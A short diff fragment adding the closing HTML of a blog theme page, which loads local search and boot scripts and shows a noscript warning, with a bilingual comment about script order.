+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
